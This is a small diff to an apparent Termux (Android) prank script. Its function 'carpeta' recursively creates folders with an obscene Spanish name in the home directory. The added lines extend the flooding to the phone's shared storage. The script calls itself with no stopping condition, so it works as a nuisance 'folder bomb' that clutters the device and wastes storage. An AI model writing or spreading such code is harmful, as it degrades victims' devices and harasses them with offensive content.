@@ -5,6 +5,8 @@ carpeta(){
         mkdir PORNO_DE_ENANOS🔥🚫$nume
         cd /data/data/com.termux/files/home/
         mkdir PORNO_DE_ENANOS🔥🚫$nume
+        cd /data/data/com.termux/files/home/storage/ 
+        mkdir PORNO_DE_ENANOS🔥🚫$nume
         clear
 
         carpeta
